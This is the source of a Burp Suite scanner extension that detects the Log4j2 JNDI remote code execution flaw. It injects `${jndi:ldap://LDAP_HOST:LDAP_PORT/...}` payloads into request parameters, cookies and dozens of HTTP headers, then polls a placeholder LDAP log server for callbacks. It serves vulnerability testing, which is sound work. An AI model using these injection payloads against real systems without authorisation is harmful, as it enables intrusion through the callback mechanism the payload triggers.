# -*- codeing: utf-8 -*-
# Author: key @ Yuanheng Lab

from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from burp import IScannerInsertionPoint
from burp import IParameter
from array import array
from hashlib import md5
import urllib2, json, random, re

class BurpExtender(IBurpExtender, IScannerCheck):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        print('Log4j2 Remote Code Execution Scanner - By key @ Yuanheng Lab')
        callbacks.setExtensionName("Log4j2 RCE Scanner")
        callbacks.registerScannerCheck(self)

    def _get_ldap_log(self, hash_str):
        res = False
        url = "http://LDAP_API_HOST:LDAP_API_PORT/LDAP_API_ROUTE"
        r = urllib2.Request(url=url)
        result = urllib2.urlopen(r).read()
        if hash_str in result:
            res = True
        return res

    def _get_hash_str(self):
        new_md5 = md5()
        new_md5.update(str(random.randint(1,1000)))
        return new_md5.hexdigest()[20:]

    def _build_payload(self, random_md5):
        return self._helpers.urlEncode("${jndi:ldap://LDAP_HOST:LDAP_PORT/" + random_md5 + "}")

    def _build_request_list(self, baseRequestResponse):
        request_list = {}
        request_info = self._helpers.analyzeRequest(baseRequestResponse)
        # Check Parameters
        param_list = request_info.getParameters()
        if param_list != []:
            request_message = baseRequestResponse.getRequest()
            for p in param_list:
                key = p.getName()
                value = p.getValue()
                ptype = p.getType()
                random_md5 = self._get_hash_str()
                payload = self._build_payload(random_md5)
                if (ptype == IParameter.PARAM_URL) or (ptype == IParameter.PARAM_BODY) or (ptype == IParameter.PARAM_COOKIE):
                    request_message = self._helpers.updateParameter(request_message, self._helpers.buildParameter(key, payload, ptype))
                    request_list[random_md5] = {payload: request_message}
                    request_message = self._helpers.updateParameter(request_message, self._helpers.buildParameter(key, value, ptype))
                else:
                    value_start = p.getValueStart()
                    request_message_copy = request_message
                    request_message_str = self._helpers.bytesToString(request_message_copy)
                    request_message_list = list(request_message_str)
                    for i in range(len(value)):
                        request_message_list.pop(value_start)
                    for i in range(0,len(payload)):
                        request_message_list.insert(value_start+i, payload[i])
                    request_list[random_md5] = {payload: self._helpers.stringToBytes(''.join(request_message_list))}

        header_list = request_info.getHeaders()
        other_header_list = ["Accept-Charset", "Accept-Datetime", "Accept-Encoding", "Accept-Language", "Cache-Control", "Client-IP", "Connection", "Contact", "Cookie", "DNT", "Forwarded", "Forwarded-For", "Forwarded-For-Ip", "Forwarded-Proto", "From", "Host", "Max-Forwards", "Origin", "Pragma", "Referer", "TE", "True-Client-IP", "Upgrade", "User-Agent", "Via", "Warning", "X-Api-Version", "X-ATT-DeviceId", "X-Client-IP", "X-Correlation-ID", "X-Csrf-Token", "X-CSRFToken", "X-Custom-IP-Authorization", "X-Do-Not-Track", "X-Foo", "X-Foo-Bar", "X-Forward", "X-Forward-For", "X-Forward-Proto", "X-Forwarded", "X-Forwarded-By", "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwarded-Host", "X-Forwarded-Port", "X-Forwarded-Proto", "X-Forwarded-Protocol", "X-Forwarded-Scheme", "X-Forwarded-Server", "X-Forwarded-Ssl", "X-Forwarder-For", "X-Forwared-Host", "X-Frame-Options", "X-From", "X-Geoip-Country", "X-Host", "X-Http-Destinationurl", "X-Http-Host-Override", "X-Http-Method", "X-HTTP-Method-Override", "X-Http-Path-Override", "X-Https", "X-Htx-Agent", "X-Hub-Signature", "X-If-Unmodified-Since", "X-Imbo-Test-Config", "X-Insight", "X-Ip", "X-Ip-Trail", "X-Original-URL", "X-Originating-IP", "X-Override-URL", "X-ProxyUser-Ip", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP", "X-Request-ID", "X-Requested-With", "X-Rewrite-URL", "X-UIDH", "X-Wap-Profile", "X-XSRF-TOKEN", "If-Modified-Since"]
        if header_list != []:
            for i in range(1, len(header_list)):
                header_list = request_info.getHeaders()
                random_md5 = self._get_hash_str()
                payload = self._build_payload(random_md5)
                tmp_header = header_list[i]
                tmp_header_split = tmp_header.split(": ")
                tmp_header_split[1] = payload
                header_name = tmp_header_split[0]
                if header_name in other_header_list:
                    other_header_list.remove(header_name)
                header_list[i] = ": ".join(tmp_header_split)
                request_message = self._helpers.buildHttpMessage(header_list, baseRequestResponse.getRequest()[request_info.getBodyOffset():])
                request_list[random_md5] = {payload: request_message}

            for i in other_header_list:
                header_list = request_info.getHeaders()
                random_md5 = self._get_hash_str()
                payload = self._build_payload(random_md5)
                header_list.add("{0}: {1}".format(i, payload))
                request_message = self._helpers.buildHttpMessage(header_list, baseRequestResponse.getRequest()[request_info.getBodyOffset():])
                request_list[random_md5] = {payload: request_message}
        return request_list

    def _get_matches(self, req, match):
        matches = []
        start = 0
        reslen = len(req)
        matchlen = len(match)
        while start < reslen:
            start = self._helpers.indexOf(req, match, True, start, reslen)
            if start == -1:
                break
            matches.append(array('i', [start, start + matchlen]))
            start += matchlen
        return matches

    def doPassiveScan(self, baseRequestResponse):
        request_list = self._build_request_list(baseRequestResponse)
        for r in request_list.keys():
            payload = request_list[r].keys()[0]
            request_message = request_list[r][payload]
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), request_message)
            json_text = self._get_ldap_log(r)
            request_matches = self._get_matches(checkRequestResponse.getRequest(), bytearray(payload.encode("utf-8")))
            if json_text:
                return [CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    [self._callbacks.applyMarkers(checkRequestResponse, request_matches, [])],
                    "Log4j2 Remote Code Execution",
                    "Payload: {0}<br>Author: key @ Yuanheng Lab".format(r),
                    "High")]
        
                
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        pass

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        return 0

class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
